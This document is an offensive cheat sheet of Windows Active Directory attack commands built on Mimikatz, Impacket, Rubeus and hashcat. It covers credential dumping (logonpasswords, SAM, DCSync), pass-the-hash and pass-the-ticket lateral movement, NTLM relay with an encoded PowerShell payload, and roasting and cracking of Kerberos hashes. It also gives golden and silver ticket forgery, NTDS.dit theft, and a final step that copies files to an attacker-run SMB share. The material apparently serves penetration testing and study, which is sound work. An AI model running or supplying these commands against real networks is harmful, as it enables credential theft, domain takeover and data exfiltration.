# Impacket + Friends
### Logged on Users
```
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
-----
./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > c:\temp\mimikatz.txt
```
### LSAdump
```
./mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
-----
./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > c:\temp\mimikatz.txt
-----
./mimikatz.exe "lsadump::sam /system:C:\temp\SYSTEM /sam:C:\tmp\SAM" "exit" > c:\temp\mimikatz.txt
```
### With Creds
```
impacket-psexec domain.com/Administrator:Password@192.168.1.1
impacket-wmiexec domain.com/Administrator:Password@192.168.1.1
impacket-smbclient domain.com/Administrator:Password@192.168.1.1
```
### Evil-Winrm
```
evil-winrm -u User -p Password -i TargetIP
evil-winrm -u User -H "HASH" -i TargetIP
```
### Pass the Hash
```
impacket-psexec -hashes 00000000000000000000000000000000:8846F7EAEE8FB117AD06BDD830B7586C Administrator@192.168.1.1
impacket-wmiexec -hashes 00000000000000000000000000000000:8846F7EAEE8FB117AD06BDD830B7586C Administrator@192.168.1.1
```
### Overpass the Hash
```
impacket-getTGT domain.com/user -dc-ip 10.10.10.1 -hashes :8846F7EAEE8FB117AD06BDD830B7586C
export KRB5CCNAME=/path/to/file
impacket-wmiexec domain.com/user@client01 -dc-ip 10.10.10.1 -target-ip 10.10.10.2 -k -no-pass
impacket-psexec domain.com/user@client01 -dc-ip 10.10.10.1 -target-ip 10.10.10.2 -k -no-pass
```
### Pass the Ticket
###### Victim
```
klist
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export
kerberos::ptt [0;11bd1]-0-0-10110000-user@cifs-web01.kirbi
exit
klist
-----
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit" > mimikatz.txt
```

###### Attacker
```
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/to/file
impacket-wmiexec domain.com/user@client01 -dc-ip 10.10.10.1 -target-ip 10.10.10.2 -k -no-pass
impacket-psexec domain.com/user@client01 -dc-ip 10.10.10.1 -target-ip 10.10.10.2 -k -no-pass
```
### Relay
###### Attacker
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.1.2 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
###### Victim
```
net use //192.168.1.69/test
```
### AS-REP Roasting
###### Attacker
```
impacket-GetNPUsers -dc-ip 10.10.10.1 -request -outputfile hashes.asreproast domain.com/user
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll
```
###### Victim
```
.\Rubeus.exe asreproast /nowrap
```
### Kerberoasting
###### Attacker
```
impacket-GetUserSPNs -dc-ip 10.10.10.1 -request -outputfile hashes.kerberoast domain.com/user
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll
```
###### Victim
```
.\Rubeus.exe kerberoast /nowrap
```
### Silver Ticket
```
.\mimikatz.exe
kerberos::golden /sid:S-1-5-21-1004336348-1177238915-682003330 /domain:domain.com /ptt /target:web01.corp.com /service:http /rc4:8846F7EAEE8FB117AD06BDD830B7586C /user:user
exit
klist
-----
./mimikatz.exe "privilege::debug" "kerberos::golden /sid:S-1-5-21-1004336348-1177238915-682003330 /domain:domain.com /ptt /target:web01.corp.com /service:http /rc4:8846F7EAEE8FB117AD06BDD830B7586C /user:user" "exit" > c:\temp\mimikatz.txt
```
### DCSync
```
.\mimikatz.exe
privilege::debug
lsadump::dcsync /user:domain\krbtgt
-----
./mimikatz.exe "privilege::debug" "lsadump::dcsync /user:domain\krbtgt" "exit" > c:\temp\mimikatz.txt
```
### Golden Ticket
```
.\mimikatz.exe
privilege::debug
kerberos::purge
kerberos::golden /user:user /domain:domain.com /sid:S-1-5-21-1004336348-1177238915-682003330 /krbtgt:8846F7EAEE8FB117AD06BDD830B7586C /ptt
misc::cmd
```
### Dumping DC Hashes
#### With Creds
```
impacket-secretsdump -just-dc-ntlm domain.com/Administrator@10.10.10.1
```
#### No Creds
###### Victim
```
vshadow.exe -nw -p  C:
copy ShowCopyDeviceName\windows\ntds\ntds.dit c:\temp\ntds.dit.bak
reg.exe save hklm\system c:\temp\system.bak
mv files to attacker's machine
```
###### Attacker
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
### pypykatz 
```
pypykatz registry --sam SAM SYSTEM
```
### Exfil
```
impacket-smbserver -username user -password password -smb2support share /path
net use \\MyIP\share /u:user password
copy File \\MyIP\share
net use * /delete /yes
```
